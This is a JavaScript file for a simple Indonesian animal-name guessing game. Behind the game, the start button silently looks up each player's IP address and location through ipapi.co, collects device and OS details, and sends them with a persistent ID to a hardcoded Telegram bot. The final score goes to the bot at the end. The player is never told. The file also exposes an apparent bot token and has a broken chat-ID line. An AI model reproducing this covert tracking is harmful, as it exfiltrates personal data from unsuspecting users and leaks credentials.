/* ================= TELEGRAM ================= */
const BOT_TOKEN = "8219584591:AAF2Eq47TP3tCJZaesGElowLmIynp_8bxDo";
const CHAT_ID  = ""8055056557;

function kirimTelegram(pesan) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: pesan
    })
  });
}

/* ================= ID UNIK USER ================= */
let userID = localStorage.getItem("userID");
if (!userID) {
  userID = "USER-" + crypto.randomUUID();
  localStorage.setItem("userID", userID);
}

/* ================= SOUND FADE IN ================= */
const bgSound = document.getElementById("bgSound");
bgSound.volume = 0;

function fadeInSound(duration = 3000, targetVolume = 0.4) {
  const interval = 100;
  const steps = duration / interval;
  const step = targetVolume / steps;
  let current = 0;

  bgSound.play();

  const fade = setInterval(() => {
    current += step;
    if (current >= targetVolume) {
      bgSound.volume = targetVolume;
      clearInterval(fade);
    } else {
      bgSound.volume = current;
    }
  }, interval);
}

/* ================= IP + LOKASI ================= */
async function getIPInfo() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const d = await res.json();
    return {
      ip: d.ip,
      city: d.city,
      region: d.region,
      country: d.country_name
    };
  } catch {
    return {
      ip: "unknown",
      city: "-",
      region: "-",
      country: "-"
    };
  }
}

/* ================= DEVICE ================= */
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let device = /mobile/i.test(ua) ? "Mobile" : "Desktop";
  let os = "Unknown";

  if (ua.includes("Android")) os = "Android";
  else if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("iPhone")) os = "iPhone";
  else if (ua.includes("Mac")) os = "MacOS";

  return { device, os };
}

/* ================= DATA HEWAN ================= */
const hewan = [
  "kucing","anjing","sapi","kambing","kerbau","kuda","ayam","bebek",
  "elang","harimau","singa","gajah","jerapah","zebra","monyet","gorila",
  "ikan","hiu","paus","lumba-lumba","ular","buaya","katak","kura-kura",
  "kelinci","tikus","beruang","serigala","rusa","unta"
];

// >700 soal
let soal = [];
for (let i = 0; i < 25; i++) {
  hewan.forEach(h => soal.push(h));
}

/* ================= GAME ================= */
let index = 0;
let score = 0;
const app = document.getElementById("app");

document.getElementById("startBtn").onclick = async () => {
  fadeInSound();

  const ip = await getIPInfo();
  const dev = getDeviceInfo();

  kirimTelegram(
`🎮 PEMAIN BARU
ID: ${userID}

🌐 IP: ${ip.ip}
📍 Lokasi: ${ip.city}, ${ip.region}, ${ip.country}

📱 Device: ${dev.device}
💻 OS: ${dev.os}

⏰ ${new Date().toLocaleString()}`
  );

  tampilSoal();
};

function tampilSoal() {
  if (index >= soal.length) {
    selesai();
    return;
  }

  app.innerHTML = `
    <h2>Tebak nama hewan:</h2>
    <h3>${soal[index]}</h3>
    <input id="jawaban" placeholder="jawaban kamu">
    <br><br>
    <button onclick="cek()">Jawab</button>
    <p>${index + 1} / ${soal.length}</p>
  `;
}

function cek() {
  const jawab = document.getElementById("jawaban").value.toLowerCase();
  if (jawab === soal[index]) score++;
  index++;
  tampilSoal();
}

function selesai() {
  kirimTelegram(
`🏁 GAME SELESAI
ID: ${userID}
Skor: ${score}/${soal.length}
⏰ ${new Date().toLocaleString()}`
  );

  app.innerHTML = `
    <h2>🎉 Game selesai</h2>
    <p>ID kamu:</p>
    <b>${userID}</b>
    <p>Skor: ${score}</p>
  `;
}
